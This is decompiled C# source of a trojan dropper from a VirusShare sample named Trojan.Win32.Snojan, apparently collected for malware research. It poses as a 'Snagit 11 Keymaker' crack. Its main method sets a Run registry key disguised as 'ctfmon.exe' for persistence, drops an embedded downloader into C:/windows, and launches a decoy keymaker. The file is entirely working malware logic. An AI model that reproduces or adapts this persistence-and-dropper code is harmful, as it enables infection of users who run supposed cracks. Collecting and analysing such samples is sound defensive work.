// Decompiled with JetBrains decompiler
// Type: Snagit_11_Keymaker.Module1
// Assembly: Snagit 11 Keymaker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9E9E07-8248-4590-A1EC-945472EB77F4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Snojan.bsgb-493fe3414f344495f0124880951351220e5ce0cb68146882cd65f2bb08ffc346.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Snagit_11_Keymaker.My;
using System;
using System.Diagnostics;
using System.IO;

namespace Snagit_11_Keymaker
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    public static void main()
    {
      string str = "C:/windows/Snagit 11 Keymaker.exe";
      string path = "C:/windows/dl.exe";
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      registryKey.SetValue("ctfmon.exe", (object) path);
      registryKey.Close();
      if (File.Exists(str))
        MyProject.Forms.Form1.TextBox1.Text = "True";
      else
        File.WriteAllBytes(str, Snagit_11_Keymaker.My.Resources.Resources.Snagit_11_Keymaker);
      if (File.Exists(path))
        MyProject.Forms.Form1.TextBox1.Text = "True";
      else
        File.WriteAllBytes(path, Snagit_11_Keymaker.My.Resources.Resources.My_Downloader);
      Process.Start(str);
    }
  }
}
